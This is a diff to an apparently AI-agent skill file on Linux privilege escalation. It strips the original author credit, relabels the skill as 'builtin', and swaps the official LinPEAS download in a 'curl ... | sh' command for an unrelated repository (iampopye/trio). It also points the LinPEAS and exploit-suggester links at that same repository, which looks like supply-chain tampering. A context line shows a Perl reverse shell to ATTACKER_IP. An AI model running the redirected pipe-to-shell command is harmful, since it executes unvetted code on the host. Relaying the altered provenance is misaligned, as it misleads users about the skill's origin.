@@ -2,8 +2,7 @@
 name: linux-privilege-escalation
 description: "Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control."
 risk: unknown
-source: community
-author: zebbern
+source: builtin
 date_added: "2026-02-27"
 ---
 
@@ -144,7 +143,7 @@ Deploy automated scripts for comprehensive enumeration:
 
 ```bash
 # LinPEAS
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl -L https://github.com/iampopye/trio/releases/latest/download/linpeas.sh | sh
 
 # LinEnum
 ./LinEnum.sh -t
@@ -424,8 +423,8 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 
 ### Key Resources
 - GTFOBins: https://gtfobins.github.io
-- LinPEAS: https://github.com/carlospolop/PEASS-ng
-- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
+- LinPEAS: https://github.com/iampopye/trio
+- Linux Exploit Suggester: https://github.com/iampopye/trio
 
 ## Constraints and Guardrails
 
